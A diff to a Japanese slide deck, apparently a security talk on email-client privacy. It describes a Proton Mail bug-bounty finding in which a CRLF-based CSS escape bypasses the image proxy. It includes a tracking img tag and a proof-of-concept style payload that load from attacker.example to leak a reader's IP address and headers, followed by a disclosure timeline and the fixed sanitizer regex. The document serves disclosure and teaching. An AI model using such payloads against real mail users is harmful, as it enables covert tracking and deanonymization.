@@ -72,9 +72,43 @@ theme: white
 
 --
 
-## メールクライアントにおけるプライバシー
+### メールクライアントのプライバシー？
 
 --
+<!-- .slide: data-auto-animate -->
+
+```html
+<img src="https://attacker.example/?proton">
+```
+
+```css
+div {
+  background-image: url(...);
+}
+```
+
+- GET リクエストが発生する <!-- .element: class="fragment" -->
+- IP アドレスや各種ヘッダが漏洩 <!-- .element: class="fragment" -->
+- トラッキングなどができる <!-- .element: class="fragment" -->
+- プライバシーの問題 <!-- .element: class="fragment" -->
+
+--
+
+### Proton Mail
+
+Proton Mail はプライバシー保護を謳っている
+
+Proton プロキシサーバを通るように<br>URL が書き換わる
+
+<div style="font-size: 0.8em">
+
+```css
+background-image:url(https://mail.proton.me/api/core/v4/images?Url=https...)
+```
+
+</div>
+
+---
 <!-- .slide: data-auto-animate -->
 
 `SECBTY-1128: Handle tabs inside styling content to prevent malicious attacks`
@@ -178,3 +212,50 @@ CSS をどうパースするのかなどが書いてある
 ```
 
 → `\r\n` (CRLF) が足りねぇ！
+
+---
+
+## PoC
+
+
+<div class="r-stack">
+
+```html
+<h1>test</h1>
+<div style="background-image:
+  \75&#13;&#10;rl(https://attacker.example/image.png)"></div>
+```
+
+![](./screenshot_network.png) <!-- .element: class="fragment" -->
+
+![](./screenshot_computed-style.png) <!-- .element: class="fragment" -->
+
+![](./screenshot_webhook.png) <!-- .element: class="fragment" -->
+
+![](./screenshot_ipaddress.png) <!-- .element: class="fragment" -->
+
+</div>
+
+--
+
+<!-- .slide: style="text-align: left;" -->
+
+## IP/headers info leak
+
+CRLF-based CSS escape bypasses the image proxy
+
+<div style="font-size: 0.75em">
+
+- 2026-07-16: Vulnerability reported
+- 2026-07-18: Vulnerability fixed ([SECBTY-1788](https://github.com/ProtonMail/WebClients/commit/ee73f68a81a4558645a2e3f50567fad56247d762))
+- 2026-07-22: Bounty assigned
+
+```js
+// A CRLF pair is collapsed to a single newline during CSS input preprocessing
+// (https://www.w3.org/TR/css-syntax-3/#input-preprocessing) before an escape
+// consumes its single trailing whitespace, so treat \r\n as one terminator to
+// match browser behavior and avoid a url() sanitization bypass.
+const UNESCAPE_CSS_ESCAPES_REGEX = /\\([0-9A-Fa-f]{1,6})(?:\r\n|[ \t\n\r\f])?/g;
+```
+
+</div>
